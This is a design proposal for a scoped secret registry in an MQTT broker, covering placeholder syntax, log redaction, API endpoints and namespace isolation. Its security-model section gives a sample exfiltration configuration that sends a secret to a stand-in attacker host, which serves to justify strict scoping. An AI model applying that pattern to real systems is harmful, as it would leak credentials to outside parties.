# Secret registry for data-integration templates

## Changelog

* 2026-05-21: @zmstone Initial draft
* 2026-07-20: @zmstone Add namespace scoping / isolation
* 2026-07-23: @zmstone Drop cross-namespace secret sharing: reference implies
  disclosure, so secrets are reachable only within their own scope (namespace
  or global), with no fallback in either direction

## Abstract

This proposal introduces a cluster-wide secret registry: a small EMQX
application that stores named byte strings, exposes a management HTTP
API scoped under data integration, and surfaces those values to
template renderers through a new placeholder syntax `$secret{<name>}`.
The placeholder is resolved at render time and is elided from every
trace and log path, so a bridge / action / rule configuration can
reference an API token by name without that token ever appearing in
debug output, audit logs, or error messages.

The registry's only purpose is to be referenced from data-integration
templates -- HTTP bridge headers / URLs / bodies, HTTP authn / authz
request templates, webhook actions. It is not a general-purpose
configuration store, not an MQTT publish payload source, and not a
key-management service. Encryption at rest, automatic rotation, and
secret-broker integration (Vault, AWS Secrets Manager) are explicit
non-goals for v1.

Read-back over the API returns metadata only -- the stored byte string
never leaves the broker except as part of a rendered template at the
moment the template is used.

Secrets are scoped: a secret is owned by the scope of the principal
that created it — a namespace, or global — and is reachable only from
configurations running in that same scope. There is no cross-scope
resolution in either direction: a namespace cannot reference a global
or sibling-namespace secret, and a global configuration cannot
reference a namespace's. This strictness is deliberate. Because a
secret is resolved by rendering it into outbound bytes, and the
principals who reference secrets are the same principals who choose
where those bytes go, the ability to *reference* a secret is
equivalent to the ability to *read* its value. The registry's
no-read-back API therefore bounds exposure of secrets at rest (config
dumps, backups, logs) but is not an access-control boundary between
"can configure" and "can learn the value"; isolation is enforced
purely by non-reachability across scopes.

## Motivation

EMQX data-integration features today expect operators to write secrets
directly into bridge / action / authn / authz configurations. A
deployment with twenty HTTP bridges sharing the same backend API token
has that token replicated in twenty places. Rotation means twenty
edits. Each of those config locations is also persistent in
`cluster.hocon`, visible via the dashboard, included in `emqx ctl data
export` artifacts, and surfaceable in any trace or debug log that
renders the template.

Three concrete pain points follow:

* **Operational**: rotation is N-touch. Tooling to mass-update the
  same value across configs is missing today and would be brittle if
  added (matching by string equality across heterogeneous templates).
* **Audit / governance**: the same shared API token is copied into
  many configs, so its plaintext lives in many places at once —
  `cluster.hocon`, dashboard config views, export artifacts. There is
  no single named handle to rotate, revoke, or reason about. (Note:
  the registry does *not* create a "reference but cannot read"
  privilege — see "Security model: reference implies disclosure"; a
  principal who can put the token into a config they control can
  always recover its value. What the registry removes is the token's
  *at-rest* sprawl, not the operator's knowledge of it.)
* **Exposure**: rendered templates appear in client trace, in rule
  engine debug output, and in HTTP request logs at the bridge level.
  Today there is no opt-in mechanism for "render this token, but
  redact it from any log line."

A central, named registry of secrets paired with a render-aware
placeholder solves all three. Operators store the secret once. Bridge
configurations reference `$secret{prod_api_token}`. The renderer
substitutes the value into the outbound bytes; the same renderer
emits `$secret{prod_api_token}` (unsubstituted) into any trace or log
record. Rotation is one HTTP PUT.

## Design

### Target release

This proposal targets EMQX v7.

### Component overview

A new application `emqx_secret_registry` under `apps/` provides:

* A cluster-wide mnesia / mria table storing `{name, value, metadata}`
  triples. Replicated to all nodes via the same shard mechanism used
  by existing config tables.
* An HTTP API under `/api/v5/secrets/...` for create,
  list, update (by overwrite), delete, and get-metadata. **The value
  field is never returned by the API.** Read-back returns metadata
  only.
* A render-side hook integrated into `emqx_template` (and any other
  template renderer that participates in data-integration paths --
  `emqx_variform`, `emqx_placeholder` as applicable) that recognises
  the `$secret{<name>}` token and substitutes it at render time.

### Storage shape

Table: `emqx_secret_registry` (mnesia, mria-replicated, on the
configuration shard so it follows the same disk-copy semantics as
cluster.hocon).

Record:

```
{emqx_secret,
   key         :: {?global_ns | binary(), binary()},  %% {OwnerNs, Name}
   value       :: binary(),      %% raw bytes, UTF-8 well-formed
   description :: binary(),      %% operator-supplied free-form note, optional
   created_at  :: integer(),     %% monotonic millis
   updated_at  :: integer()      %% monotonic millis
}
```

The owning scope (`?global_ns` or a namespace) is the first element
of the key. A secret is reachable only from configurations running in
its owning scope; there is no cross-scope resolution (see "Namespace
scoping and isolation" below), so no per-secret sharing attribute is
needed.

The primary key is the `{OwnerNs, Name}` pair, following the v2
topic-metrics precedent (`emqx_topic_metrics_mria`, keyed
`{'_' | global | binary(), '_' | binary()}`). Names are unique
*within* a namespace, not cluster-wide. See "Namespace scoping"
below.

Constraints:

* `name` matches `^[A-Za-z0-9][A-Za-z0-9_-]{0,62}$` (same alphabet as
  `emqx_utils:is_restricted_str/1` used for client-attr names). 63-byte
  cap. Names are case-sensitive.
* `value` is at most 16 KiB. Stored as-is after a UTF-8 well-formedness
  check. PEM-encoded private keys (newline-containing) are permitted.
* `description` is at most 512 bytes, UTF-8, control-character-free
  except whitespace.
* The total number of secrets is capped at 1024 **per namespace**
  (configurable; see Configuration Changes), with the global namespace
  counting as one namespace for this purpose. A per-namespace cap
  rather than a cluster-wide one keeps one tenant from exhausting the
  registry for everyone; the precedents are `?MAX_NUM_TNS_CONFIGS`
  (1000 managed namespaces) and `?MAX_COLLECTIONS` (512 topic-metric
  collections).

### Sanitization

At storage time, validate:

* `name` matches the regex above.
* `value` is well-formed UTF-8 (via `unicode:characters_to_binary/1`).
  Reject otherwise. This is a well-formedness check, not a
  character-class check -- newlines are permitted in the stored value.
* `description` rejected if it contains bytes 0x00–0x1F or 0x7F–0x9F,
  except 0x09 / 0x0A (tab, newline) which are kept.

At **use time** (i.e. when the renderer inlines a secret into an
outbound byte stream), the consumer of the rendered output must apply
its own context-appropriate validation:

* HTTP header value: reject if it contains CR / LF / NUL. The header
  byte check landed in `emqx_utils:http_header_byte_check/1` is
  already in place; rendered output flowing through the HTTP bridge
  connector and the HTTP authn / authz utils inherits it for free.
* HTTP URL: reject, never use secrets in URL.
* HTTP body: no additional check (operator is responsible for shaping
  the body).
* MQTT topic / payload template: `$secret{...}` placeholders are
  **rejected at config-validation time** for these contexts. See
  "where the placeholder is allowed" below.
* Action / source / connector secret-typed config field (resolved
  via `secret://<name>`): no additional check at the registry layer
  -- the consuming connector (Kafka SASL, HTTP basic auth, MongoDB
  credential, etc.) imposes whatever byte / encoding constraints
  its underlying protocol requires, at its own use site.

This split -- store as-given (UTF-8 only), validate at use site --
mirrors how PEM keys flow through TLS configuration today and avoids
constraining what shape an operator's API token may take.

### Placeholder syntax

A new template token `$secret{<name>}` is recognised by the renderers
that participate in data-integration paths:

* `emqx_template` (the main template renderer used by HTTP bridge
  headers, URLs, bodies, and by `emqx_auth_http_utils`).
* `emqx_placeholder` (the legacy placeholder substitutor used in
  rule SQL `FOREACH`, rule action templates).
* `emqx_variform` (the expression engine used in `client_attrs_init`,
  `clientid_override`, etc.).

In each renderer, when the substitution engine encounters
`$secret{<name>}`, it:

1. Looks up `<name>` in `emqx_secret_registry`.
2. On hit, substitutes the stored byte string.
3. On miss, the behavior is **strict-rendering-fail by default** --
   the render call returns `{error, {unknown_secret, Name}}` and the
   consumer (the HTTP bridge connector, the authn request builder,
   etc.) treats this as a configuration-time error and aborts the
   operation. Logging records `{unknown_secret, Name}` -- name only,
   never any stand-in value.

The renderer's debug / trace output paths use a separate code path
that emits `$secret{<name>}` verbatim (unsubstituted) wherever a
fully-rendered template would otherwise appear. This is the key
invariant of the design: the renderer has two output channels (wire
and log), and the secret never lands on the log channel.

### Where the placeholder is allowed

| Context | Allowed | Notes |
|---|---|---|
| HTTP bridge action: header value | yes | Primary use case. Bytes inherit the header byte check at the connector. |
| HTTP bridge action: URL | yes | URL components are byte-checked at the connector. |
| HTTP bridge action: body template | yes | Body shape is operator's responsibility. |
| HTTP authn request: header / body | yes | Same template renderer; falls in for free. |
| HTTP authz request: header / body | yes | Same. |
| Webhook action template | yes | Same. |
| Rule SQL `FOREACH`, `SELECT` payload shaping | yes | Body-shaping use case. |
| MQTT topic template (rule republish, mountpoint) | **no** | No use case, and a topic appearing in audit logs would leak the secret. Reject at config-validation time. |
| MQTT payload template (rule republish) | **no** | Same. Payloads on the broker should not contain backend-credential bytes by accident. |
| `mqtt.clientid_override`, `mqtt.client_attrs_init.expression` | **no** | A clientid or attribute appearing in client log meta and being templated from a secret is a footgun. |
| Listener / cluster / static config | **no** | Secrets are a runtime concept and should not feed bootstrapping configuration. |
| Action / source / connector **password / API-key field** (typed `emqx_schema_secret:mk/1`) | n/a -- use the `secret://<name>` URI instead | These are HOCON secret-typed fields, not template strings; see the `secret://` section below. The placeholder is for template rendering, not for HOCON secret fields. |

The disallowed contexts reject at configuration validation time --
`{error, {secret_placeholder_not_allowed, <context>}}` returned from
the schema check, no runtime surprise.

### Rule SQL function `get_secret(<name>)`

In addition to the placeholder syntax, a rule SQL function
`get_secret(<name>)` is provided for cases where the secret value
needs to participate in an SQL expression (e.g. HMAC-signing a
payload, building a custom Authorization header value out of multiple
pieces, or passing as one argument among many to another SQL
function).

```
SELECT
  payload,
  hmac_sha256(get_secret('webhook_signing_key'), payload) AS signature
FROM "events/#"
```

The function looks up the secret by name in the registry and returns
the stored byte string. On miss, returns `undefined` (consistent with
the rest of the rule SQL function surface) and the rule continues --
typically resulting in a downstream `undefined` argument that the
caller handles per its own semantics.

**The placeholder is the preferred path; `get_secret/1` is the
escape hatch.** Its drawback is structural: once the value is bound
to a SQL variable or used as an argument to another function, it
flows through the standard rule expression pipeline, which includes
the rule debug / trace output. That output can be enabled per-rule by
operators via the dashboard or REST API, and any debug log emitted
while the rule is being traced will record the resolved value
verbatim alongside the other intermediate expression results.
The placeholder, by contrast, is special-cased in the renderer's
log-channel formatter and is preserved as `$secret{<name>}` in every
trace and debug path.

Concretely, the difference shows up here:

* `Authorization: Bearer $secret{prod_token}` in a bridge header
  template -> trace log records the header template verbatim with
  `$secret{prod_token}` unsubstituted. Wire sees the substituted
  value.
* `SELECT get_secret('prod_token') AS token` in a rule with debug
  enabled -> trace log records `token = "abc123..."` (or however the
  secret value renders) alongside every other SQL result. Wire sees
  the value too, of course.

For straight credential substitution into a bridge or action
template, prefer the placeholder. Use `get_secret/1` only when the
value must participate in an SQL expression that the placeholder
syntax cannot express, and accept the trace-exposure trade-off --
or disable rule tracing on rules that reference secrets.

Documentation will lead with the placeholder, mention `get_secret/1`
as the escape hatch, and call out the trace-exposure caveat at the
point of first introduction.

### `secret://<name>` for HOCON secret fields

Action / source / connector configurations expose dedicated *secret*
fields (passwords, API tokens, bearer tokens, etc.) that are typed
through `emqx_schema_secret:mk/1`. Today those fields accept a raw
string or a `file://<path>` URI; the URI form is resolved lazily by
`emqx_secret_loader:load/1` at use time, and redaction in
`emqx_utils_redact` already keeps the URI itself out of logs.

We extend the same plumbing with a parallel `secret://<name>` URI
that resolves against the registry:

* HOCON parse / schema convert: `emqx_schema_secret:wrap/1` gets a
  new clause matching `<<"secret://", _/binary>>`, producing
  `emqx_secret:wrap_load({secret_registry, Name})`.
* Lazy load: `emqx_secret_loader:load({secret_registry, Name})`
  looks the name up in `emqx_secret_registry` and returns the bytes.
  On miss, throws `#{msg => failed_to_resolve_secret, name => Name}`
  with the same shape as the existing `failed_to_read_secret_file`
  error. The caller (the connector / action start path) treats this
  as a startup failure and surfaces it in the resource error state,
  exactly as it would for a missing `file://` path.
* Redaction: `emqx_utils_redact:do_redact_v/1` gets a new clause
  matching `<<"secret://", _/binary>>` that preserves the URI in
  serialized config dumps without expanding it. The URI itself is
  not sensitive -- it names a registry entry; the value behind the
  name is what we're hiding.
* HOCON serialization round-trip: `source/1` produces
  `<<"secret://", Name/binary>>` from the wrapped term, so config
  exports and `cluster.hocon` materializations preserve the URI form
  rather than the resolved value.

Eligible fields: any field declared via `emqx_schema_secret:mk/1`.
That means every existing password / token / API-key field in
connector and authn / authz schemas inherits `secret://` support
without per-field changes. The list is large enough that enumerating
it here would rot quickly; the operative rule is "if the field is
already `emqx_schema_secret:mk/1`, it supports `file://` today and
will support `secret://` after this change."

Worked example -- a Kafka producer connector's SASL password:

```hocon
connectors.kafka_producer.demo {
  authentication {
    mechanism = "plain"
    username  = "emqx"
    password  = "secret://kafka_prod_password"
  }
  ...
}
```

At connector start, the password is resolved against the registry;
log lines that today print `file:///etc/emqx/kafka.pw` would print
`secret://kafka_prod_password` for the registry case. Rotation is
the same `PUT /api/v5/secrets/kafka_prod_password` HTTP call --
existing connector instances continue to use the cached resolved
value until they restart (matching `file://` semantics). A separate
"force-reload-secrets" administrative action can be considered later
if hot rotation becomes a requirement; for v1 the reload model is
"restart the resource that uses the secret," which is consistent
with how `file://` works today.

This gives the registry three coherent access surfaces, each
matching the shape of its consumer:

| Consumer | Access mechanism | Log behavior |
|---|---|---|
| Template-rendered output (HTTP bridge headers / URLs / bodies, authn / authz HTTP request templates, webhook templates) | `$secret{<name>}` placeholder | Placeholder preserved in trace / debug logs |
| Rule SQL expression (HMAC, multi-input composition) | `get_secret('<name>')` function | Resolved value may appear in rule trace when tracing is enabled -- escape hatch only |
| Connector / action / source / authn / authz **password / API-key field** (typed `emqx_schema_secret:mk/1`) | `secret://<name>` URI in HOCON | URI preserved in config dumps; resolved value never logged |

### API surface

Path prefix: `/api/v5/secrets`. The endpoints sit at the top level of
the REST surface, not under any sub-namespace. The
"data-integration-only" association is expressed through the API-key
scope, not through the URL.

API key scope: the endpoints are gated under the existing
`data_integration` scope -- the same scope that already governs
bridges, actions, connectors, and rules. Operators who already
manage data-integration via API keys get secret management with the
same scope grant. Dashboard role-based access maps to the same
scope tag. Gating is enforced through the API-key scope-check layer
introduced on release-60 (`emqx_mgmt_auth:check_scopes/2`).

Endpoints:

* `POST /api/v5/secrets`
  body: `{ "name": "...", "value": "...", "description": "..." }`
  Creates a new secret in the caller's scope. Errors on name
  collision within that scope.
* `GET /api/v5/secrets`
  Returns a paginated list of `{ name, description, scope,
  created_at, updated_at }`, where `scope` is `global` or the owning
  namespace. **The value is never returned.** The list contains only
  the caller's own scope; other scopes' secrets are omitted (see
  "API surface" under Namespace scoping).
* `GET /api/v5/secrets/{name}`
  Returns `{ name, description, scope, created_at, updated_at }`.
  **The value is never returned.** A request for a name outside the
  caller's scope returns `404`, indistinguishable from a nonexistent
  name.
* `PUT /api/v5/secrets/{name}`
  body: `{ "value": "...", "description": "..." }`
  Overwrites the existing secret. This is the rotation path.
* `DELETE /api/v5/secrets/{name}`
  Removes the secret. The renderer's strict-fail behavior applies to
  any subsequent template render that references the deleted name.

All five endpoints accept a `?ns=<namespace>` query parameter and are
scoped to the caller's namespace; see "Namespace scoping and
isolation" above.

### Logging and tracing

All log emissions involving template rendering must go through the
log-channel formatter rather than substituting on the wire and then
logging. Concretely:

* Bridge debug log records `template = "Authorization: Bearer $secret{prod_token}"`,
  not `template = "Authorization: Bearer abc123"`.
* Rule engine trace records show `$secret{...}` placeholders verbatim.
* HTTP authn / authz request logs (when enabled) record
  `$secret{...}` placeholders, not the substituted value.
* Audit log records secret-management API operations as
  `{action, create|update|delete, name, actor}` -- never the value.

### Backup / export

`emqx ctl data export` and the corresponding REST endpoint exclude
the secret registry by default. A future opt-in (`--include-secrets`,
plus an encryption requirement) can be considered separately; for v1
the registry is excluded outright. This must be wired explicitly into
`emqx_mgmt_data_backup` -- forgetting to do so is the predictable
foot-gun.

`emqx ctl data import` accepts a backup that omits the secret table.
If a backup containing a `secrets` table is presented and the running
cluster also has secrets configured, the import fails closed with a
clear error rather than merging.

### Cluster replication

The mnesia table sits on the same shard as other configuration data
(`emqx_conf` shard or its equivalent on release-63 -- to be confirmed
during implementation). This means:

* All nodes in the cluster see all secrets.
* A new node joining the cluster receives the secrets table as part
  of the standard mria join.
* Network partitions follow the same semantics as any other
  configuration data -- mria's standard reconciliation applies.

The secret registry does **not** require its own shard, its own
quorum, or any cluster-wide RPC during render. Render-time lookups
are local mnesia dirty reads.

### Namespace scoping and isolation

EMQX supports namespaces (multi-tenancy) for connectors, actions,
sources, rules, authn / authz built-in-database records, managed
certificates, and topic metrics. Secrets are referenced from
precisely those resources, so the registry must be namespace-aware or
it becomes the one shared mutable surface that punches through tenant
isolation.

#### Ownership model

Every secret is owned by exactly one namespace. The owner is the
namespace of the principal that created it, determined the same way
every other namespaced API determines it:

* The namespace is encoded in the API key / dashboard user role as
  `ns:<namespace>::<role>` and parsed by
  `emqx_dashboard_rbac:parse_role/1`.
* At the HTTP boundary `emqx_dashboard:get_namespace/1` reads it out
  of `auth_meta`, defaulting to `?global_ns`.
* A `resolve_namespace/2` minirest filter stores the effective
  namespace as `resolved_ns` on the request, applying the established
  rule: a **global** admin may act on any namespace by passing
  `?ns=<namespace>`; a **namespaced** admin is pinned to their own and
  gets `not_authorized` if they pass a different one. This mirrors
  `emqx_connector_api:parse_namespace/1`.

A secret created with a global API key is owned by `?global_ns`. A
secret created with a namespace-scoped API key is owned by that
namespace.

#### Security model: reference implies disclosure

The API never returns a value to anyone. It is tempting to read that
as "an operator can be granted the ability to *reference* a secret
without being granted the ability to *read* it." For the audience
that references secrets — principals with data-integration write
access — that reading is false.

Anyone who can author a data-integration resource controls where its
rendered output goes, and every such resource is an oracle for the
secret it references:

* An HTTP bridge with `X-Steal = "$secret{token}"` and
  `url = "https://attacker.example/collect"` renders the value onto
  the wire toward an endpoint the author controls.
* A rule `SELECT get_secret('token') AS v` that republishes to a
  topic the author subscribes to leaks the value with no egress at
  all.
* Enabling trace on one's own rule that references the secret records
  the resolved value in the trace log.

So for this feature **the ability to reference a secret is equivalent
to the ability to read its value.** Disabling read-back on the API
narrows the exposure of secrets *at rest* (config dumps, backups,
dashboard, logs — see Motivation) but is not an access-control
boundary between "can configure" and "can learn the value." The EIP
does not claim otherwise.

The one boundary that *is* real is the negative one: a secret a
principal **cannot reference** is a secret that principal cannot
exfiltrate. Cross-scope isolation is therefore built entirely on
*non-reachability*, not on any view gate.

#### Resolution: strictly within one scope, no fallback

Each secret belongs to exactly one scope — a namespace, or global —
and is reachable only from configurations running in that same scope:

* A reference (`$secret{N}`, `get_secret('N')`, `secret://N`)
  evaluated in namespace `NS` resolves `{NS, N}` **only**.
* A reference evaluated in the global scope resolves
  `{?global_ns, N}` **only**.
* On miss — including a name that exists only in a *different* scope —
  the strict-fail behavior described earlier applies
  (`{error, {unknown_secret, Name}}`). The failure is identical
  whether the name is unknown or merely out-of-scope, so a tenant
  cannot probe for the existence of another scope's names.

There is no namespace→global fallback and no global→namespace
fallback. Because reference implies disclosure, a fallback that let a
tenant reference a global secret would be exactly a grant of that
secret's value to the tenant; a fallback the other direction would
let a tenant feed a value into a broker-wide code path. Both are the
isolation breaks we are avoiding, so neither direction exists. No
qualified `global::<name>` / `secret://global/<name>` cross-scope
form is provided either — there is no reachable target outside the
caller's own scope to name.

The consequence is deliberate: a credential that must be used from
both a global configuration and a tenant's configuration is stored
**once per scope** that uses it. Rotating such a genuinely-common
credential is therefore per-scope — an N-touch operation across the
scopes that hold a copy. This is the accepted v1 trade-off for an
isolation model that is provably simple: one scope, one set of
reachable secrets, no cross-scope reference anywhere. Targeted
cross-scope sharing — with its "sharing = disclosing" semantics made
explicit — is left to a future version; see "Declined alternatives."

#### The resolving scope is the configuration's, not the client's

A secret is resolved in the scope of the *configuration that
references it*, never in the scope of whatever MQTT client happens to
trigger the render. This distinction is load-bearing for
authentication, where the client's namespace is frequently not yet
established at the moment a secret must be resolved.

A client connects in the **global scope**: its namespace (`tns`) is
not known at TCP-accept time and is commonly *initialized from the
authentication result itself* (an authn backend returns a `tns` /
`namespace` attribute, or it is derived during the authn exchange).
An HTTP authn / authz request template that references a secret is
therefore rendered *before* the client has a namespace at all.

Resolution keys off the **authenticator's / authz source's own
scope**, which is known from that resource's configuration:

* A **namespaced** authenticator (configured under namespace `NS`)
  resolves its `$secret{...}` references against `{NS, _}`, even
  though the connecting client is still in the unresolved/global
  scope. This is *not* a global→namespace fallback: the reference is
  owned by a namespaced configuration, so it resolves in that
  namespace by the ordinary rule above. A client being pre-`tns` does
  not downgrade the authenticator's scope to global.
* A **global** authenticator resolves against `{?global_ns, _}`.

The implementation must take the resolving namespace from the
authenticator/source configuration (the chain the client is
authenticating against), and must **not** substitute the client's
not-yet-resolved `tns` (which would wrongly fall to global and fail
to find a namespaced authenticator's secret, breaking namespaced
authentication). Concretely: do not thread `tns` from the channel
into secret resolution on the authn path; thread the authenticator's
namespace.

#### Where the namespace comes from at resolution time

Each of the three access paths already has the namespace in hand:

| Access path | Source of namespace |
|---|---|
| `secret://<name>` in a connector / action / source config | The resource is namespaced; the namespace is carried in the resource id (`ns:<Ns>:connector:<Type>:<Name>`) and extractable via `emqx_resource:extract_namespace_from_resource_id/1`. |
| `$secret{<name>}` in an HTTP bridge / action template | Same — the rendering happens inside a namespaced resource. |
| `$secret{<name>}` / `get_secret('<name>')` in a rule | The rule record carries `namespace`; `emqx_rule_runtime` already propagates it into every action invocation and trace context. |
| `$secret{<name>}` in an HTTP authn / authz request template | The **authenticator / authz source's own** namespace, taken from its configuration — **not** the connecting client's `tns`, which is typically unresolved at authn time (see "The resolving scope is the configuration's, not the client's"). |

The practical implication for implementation is that
`emqx_secret_loader:load/1` and the template renderer hooks must take
a `maybe_namespace()` argument rather than a bare name. Threading
that argument through every call site is the bulk of the work — a
default-to-global arity-1 wrapper would compile, and would silently
resolve every namespaced lookup against the global scope: on the
data-integration paths it resolves the wrong secret (or fails closed),
and on the authn path it breaks namespaced authentication by missing
the authenticator's namespaced secret. It must not be added.

#### API surface

The endpoints described above gain the standard namespace plumbing:

* A `?ns=<namespace>` query parameter on all five endpoints, honoured
  for global admins, rejected for namespaced admins naming a
  namespace other than their own.
* `validate_managed_namespace/2` on create — running the
  `'namespace.resource_pre_create'` hook, returning
  `Managed namespace not found` for an unknown namespace, exactly as
  the connector / rule / authn APIs do. `DELETE` is exempted for
  global admins so orphaned secrets can be cleaned up after a
  namespace is gone.
* A `?SECRETS_API` clause in `emqx_dashboard_rbac:do_check_rbac/3`.
  Without it the catch-all denies namespaced admins outright.

One caveat has to be recorded explicitly. `do_check_rbac/3` currently
contains a blanket clause allowing **any** `GET` for a namespaced
superuser, on the documented rationale that "namespaces are mostly to
avoid accidentally mutating the wrong resources rather than hiding
information." For this feature that rationale does not hold: a
namespaced admin must not be able to enumerate another scope's secret
*names*, since names are chosen by operators and routinely describe
the system they unlock. The secrets API therefore filters list / get
results **in the handler**, not relying on the RBAC layer. A caller
whose `resolved_ns` is a namespace `NS` sees exactly the rows owned by
`NS`; every other row — global secrets and other namespaces' secrets
alike — is omitted from lists and returns `404` on direct `GET`. A
global admin (optionally scoped via `?ns=`) sees exactly the rows of
the scope they are acting in.

Create / update / delete are restricted to rows the caller owns
(`resolved_ns`), so a namespaced admin can only manage their own
namespace's secrets and a global admin only global (or, via `?ns=`, a
named namespace's) secrets. No principal can reach across scopes.

Values are never returned by any endpoint regardless of scope. As
"Security model" notes, this bounds at-rest exposure but is not the
isolation boundary; the isolation boundary is that a scope can neither
reference nor enumerate any secret outside itself.

#### Namespace deletion

The registry subscribes to the `'namespace.delete'` hookpoint and
deletes all rows keyed `{NS, _}`. Secrets live outside the config
tree, so the `emqx_mt_config_janitor` config-root teardown does not
reach them — a hook callback is required, not optional. This is the
same gap that authn / authz namespaced mnesia rows and v2
topic-metrics collections currently have; we should not add a third
instance of it.

The callback must be idempotent and retry-safe: the janitor re-scans
tombstones periodically and re-runs cleanup if a previous attempt
failed.

Deleting a namespace does **not** touch global secrets or any other
namespace's secrets; only rows keyed `{NS, _}` are removed.

#### Backup / export

The registry is excluded from backup entirely (see "Backup / export"
above), so there is no per-namespace export behavior to define. Were
it to become opt-in later, the export must be filtered by the
requesting principal's namespace — a namespaced admin's export must
not carry global or sibling-namespace secrets.

## Configuration Changes

No defaults need changing for any existing config field.

## Backwards Compatibility

This is a pure addition. Existing configurations continue to work
without modification.

A bridge configuration that today has `headers = { Authorization =
"Bearer abc123" }` is unchanged. The operator can choose to migrate
to `headers = { Authorization = "Bearer $secret{prod_token}" }` after
creating the secret, but is not required to.

The strict-rendering-fail behavior on missing secrets means
configurations referencing nonexistent secret names will fail closed.
This is by design and aligns with the existing behavior for missing
required template variables in HTTP bridges.

## Document Changes

* New documentation section under data integration explaining the
  secret registry, the placeholder syntax, where it is allowed, and
  rotation patterns.
* Update the HTTP bridge / authn-http / authz-http documentation to
  cross-reference the placeholder as the preferred way to template
  credentials.
* Update the `emqx ctl data export` / `data import` documentation to
  note the registry exclusion.

## Testing Suggestions

* Common tests for the registry itself: CRUD via API; cluster
  replication (write on node A, read on node B); name regex
  validation; UTF-8 well-formedness; length caps; max-count cap;
  scope check on the management API.
* Rendering tests: `$secret{name}` substitutes correctly in each
  allowed context; rejected at config-validation time in disallowed
  contexts; missing-secret produces strict-fail; renamed secret is
  picked up on next render.
* Log / trace tests: every relevant log path (bridge debug, rule
  engine trace, authn/authz request log, audit log) emits
  `$secret{...}` verbatim and never the substituted value. This is
  the most important class of test -- a regression here defeats the
  whole feature.
* Backup tests: `emqx ctl data export` produces an archive that
  contains no secret values; `data import` rejects archives
  containing a secrets table when the cluster already has secrets.
* Namespace tests -- the isolation-critical class:
  * A namespaced config resolves a bare name to its own namespace's
    secret; the same name existing only in the global scope (or in a
    sibling namespace) is **not** resolved and strict-fails, with a
    failure indistinguishable from a nonexistent name. This is the
    value-exfiltration test: a tenant bridge referencing a global name
    must never render that value onto the wire.
  * A global config resolves only global secrets and never a
    namespace-owned secret, even when the name exists only in a
    namespace.
  * No cross-scope qualified form exists: `$secret{global::name}` /
    `secret://global/name` from a namespaced context do not resolve
    (they are treated as an unknown name or a config-validation
    error, per implementation choice — assert whichever is chosen).
  * Authn scoping: a **namespaced** HTTP authenticator resolves its
    `$secret{...}` against its own namespace even though the
    connecting client has no `tns` yet (and even when the client's
    `tns` is initialized *from* this authentication). A **global**
    authenticator resolves against global. A regression that keys
    resolution off the client's unresolved `tns` must fail this test.
  * A namespaced admin cannot create, read, update, delete, or
    **list** another scope's secrets (another namespace's *or* the
    global scope's); a global admin can act on any namespace via
    `?ns=`.
  * Per-namespace cap is enforced per namespace, not cluster-wide.
  * `'namespace.delete'` removes exactly that namespace's secrets and
    leaves global and sibling-namespace ones intact; re-running the
    cleanup is a no-op.
* HTTP-header byte check composition: a stored secret whose value
  contains CR / LF is accepted at storage time (UTF-8-only check
  passes), but rejected at the HTTP bridge connector when used as a
  header value. Verify the rejection path emits a log line that
  identifies the secret by name but not by value.

## Declined Alternatives

### Rule function `get_secret(<name>)` as the *only* access surface

Considered: expose only a rule SQL function and skip the placeholder.
Rejected: a SQL function's return value flows through the standard
rule expression pipeline, including the trace / debug output paths,
so any rule with tracing enabled records the resolved secret value
verbatim in log lines. There is no way to ensure redaction across
every consumer of an SQL function's return because the function does
not know its caller's logging context. The placeholder, by being a
distinct lexical token recognised by the renderer, can be
special-cased uniformly across every render code path, and is the
preferred path for the common "interpolate credential into outbound
header / body / URL" use case.

We do ship `get_secret/1` as an escape hatch for the cases where the
secret value needs to participate in an SQL expression (HMAC-signing
a payload, composing a header value from multiple SQL inputs, etc.).
See the "Rule SQL function `get_secret(<name>)`" design section for
the documented trace-exposure caveat.

### Encryption at rest with a master key

Considered: encrypt secret values in mnesia using a master key
configured via env var or HSM. Rejected for v1: this requires master
key management, key rotation policies, and a recovery procedure for
"lost master key, regenerate registry" scenarios. Filesystem-level
encryption (LUKS, AWS EBS encryption, GCP persistent disk
encryption) provides the at-rest property without adding key
management to EMQX's surface area. Mention as a possible v2.

### Vault / AWS Secrets Manager / external broker integration

Considered: instead of (or in addition to) a built-in registry,
support fetching secrets from external secret brokers at render
time. Rejected for v1 on two grounds: it expands the surface area
significantly (broker plugins, credential management for the broker
connection, timeout / cache semantics for slow brokers, error
handling for "broker reachable but secret missing" vs "broker
unreachable"), and it shifts the operational model from "EMQX is
self-contained" to "EMQX has a hard runtime dependency on an
external secret service." Operators who want Vault-backed secrets
can run a Vault Agent sidecar that templates a HOCON file containing
`emqx_secret_registry` CRUD calls and re-applies on rotation.

### Returning the value via GET

Considered: allow `GET /api/v5/secrets/{name}` to
return the value to an operator with sufficient privilege. Rejected,
though for narrower reasons than one might first assume. It is *not*
rejected to preserve a "configure but cannot read" boundary — no such
boundary exists (see "Security model: reference implies disclosure").
It is rejected because keeping read-back uniformly disabled (a) keeps
plaintext secrets out of one more egress surface — API responses, and
their proxy / gateway / browser-history trail — reinforcing the
at-rest exposure reduction that *is* the feature's value, and (b)
keeps the audit story crisp: "did any operator read this secret over
the API" is uniformly answerable as "no," with disclosure occurring
only through the referencing paths that already carry it. Rotation is
the rotation path; an operator who needs the value elsewhere should
store their own copy.

### Cross-namespace secret sharing (fallback, `shared_ns` flag, or allowlist)

Considered, across several shapes and the subject of the review that
prompted this revision:

1. **Implicit fallback** — a namespaced reference to name `N` that
   misses locally falls back to the global `N`. This was the shape of
   an earlier draft.
2. **Opt-in `shared_ns` flag** — a global secret is reachable from
   namespaces only when a global admin marks it shared.
3. **Per-namespace allowlist** — a global secret carries the list of
   namespaces it is offered to.

All three are rejected for v1, on one root observation: **referencing
a secret is equivalent to reading its value** (see "Security model:
reference implies disclosure"). A tenant who can reference a secret in
a resource they control can render it to an endpoint they control and
read it off the wire. So any mechanism that lets a namespace reference
a global secret is, precisely, a mechanism that discloses that
secret's value to the namespace's administrators — regardless of the
no-read-back API.

That reframes the design question from "how do we let tenants
*reference but not read* a shared secret" (which is impossible) to
"do we want a way to *disclose* a global credential to specific
tenants." For v1 the answer is no: cross-scope reference does not
exist in any form. Shape 1 is the most dangerous (silent, name-guess
exfiltration) and is out. Shape 2's `shared_ns` reads as a
view-protection but is really an all-tenants disclosure switch — its
name over-promises, so we do not ship it. Shape 3 is the *honest*
form of the feature (targeted disclosure) but adds a cross-namespace
ACL surface that must stay consistent across namespace lifecycle, for
a use case ("one credential shared to some tenants, rotated once")
that has not yet been asked for. If that need materializes, shape 3
